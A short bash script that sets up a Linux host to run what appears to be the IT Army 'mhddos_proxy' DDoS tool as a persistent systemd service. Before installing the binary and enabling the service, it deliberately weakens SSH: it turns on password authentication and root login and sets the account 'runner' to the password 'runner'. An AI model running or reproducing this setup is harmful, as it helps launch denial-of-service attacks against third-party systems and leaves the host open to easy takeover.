#!/bin/bash
set -e

echo "[*] setup env"
sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
sudo echo "runner:runner" | chpasswd
sudo systemctl restart ssh

echo "[*] Preparing service"
cp /mnt/repo/logpush/itarmy/mhddos.service /etc/systemd/system

cp /mnt/repo/logpush/itarmy/bin/mhddos_proxy_linux /opt/itarmy/bin

echo "[*] Enable and start service"
systemctl daemon-reload
systemctl enable mhddos.service
systemctl restart mhddos.service



echo "[+] env and directories finished successfully"
